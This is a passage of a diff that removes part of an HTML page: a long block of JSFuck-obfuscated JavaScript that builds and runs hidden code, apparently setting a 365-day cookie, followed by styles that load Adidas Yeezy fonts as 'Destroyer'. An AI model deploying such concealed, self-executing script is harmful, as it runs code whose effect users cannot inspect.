]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[!+[]+!+[]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+[+!+[]]+(+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+[+[]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]], 365);
-        }
-    }
-  </script>
-  <style>
-    @font-face { font-family: DestroyerA; src: url('http://www.adidas.com/com/apps/VB3Mso/vp_assets/fonts/yeezy_tstar-regular-webfont.tf?env=&v=11.0.34'); }
-    @font-face { font-family: DestroyerB; src: url('http://www.adidas.com/com/apps/VB3Mso/vp_assets/fonts/yeezy_tstar-bold-webfont.ttf?env=&v=11.0.34'); }
-    h1 { font-family: DestroyerB; }
-    h2 { font-family: DestroyerB; }
-    h3 { font-family: DestroyerB; }
-    h4 { font-family: DestroyerB; }
-    p  { font-family: DestroyerB; }
-    a  { font-family: DestroyerB; }
-    td { font-family: DestroyerB; }
-    #headers {
-    font-family: DestroyerB;
-    background-color: #505050;
-    color: #ffffff;
-    vertical-align: middle;
-    }
-    body {
-    background:
-    url(data:image/png;base64,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